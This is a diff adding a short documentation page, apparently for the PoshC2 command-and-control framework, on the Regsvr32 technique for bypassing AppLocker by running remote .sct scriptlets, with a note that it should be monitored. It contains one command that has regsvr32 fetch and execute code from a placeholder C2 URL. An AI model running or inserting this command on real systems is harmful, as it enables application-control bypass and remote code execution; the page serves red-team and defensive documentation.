@@ -1,0 +1,18 @@
+###########
+RegSvr32 
+###########
+Mitre ATT&CK - `Regsvr32 <https://attack.mitre.org/wiki/Technique/T1117>`_
+
+Regsvr32 is a command line utility that is used to register/unregister .dll files into the registry. 
+
+SubTee (Casey Smith) discovered that it was possible to bypass AppLocker script rules by calling the regsrv32 to execute a command or arbitrary code through the use of .sct files. This form of execution has some benefits as its a trusted binary, proxy aware and supports HTTPS. 
+
+PoshC2 creates SCT files that can be used with this execution method, note this should be monitored as a form of execution.
+
+regsvr32 do not work with untrusted SSL certificates if using over HTTPS:
+
+.. code-block:: python
+
+	regsvr32 /s /n /u /i:https://www.c2.com/news/j9hau_rg scrobj.dll
+
+
